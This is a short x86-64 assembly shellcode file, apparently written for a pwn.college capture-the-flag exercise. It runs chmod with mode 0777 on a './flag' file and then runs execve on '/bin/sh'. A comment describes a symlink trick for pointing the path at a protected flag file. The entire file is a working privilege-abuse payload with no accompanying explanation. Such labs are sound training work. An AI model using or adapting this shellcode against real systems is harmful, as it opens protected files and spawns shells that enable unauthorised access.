.global _start
_start:
.intel_syntax noprefix

	push 90
	pop rax
	lea rdi, [rip+flagfile]
	push 0x1ff
	pop rsi
	syscall
	push 59
	pop rax
	lea rdi, [rip+binsh]
	push 0
	pop rsi
	push 0
	pop rdx
	syscall
binsh:	
	.string "/bin/sh"
flagfile:
	.string "./flag" #in pwncollege server change ./flag to use symlink to ../../flag -> ./a
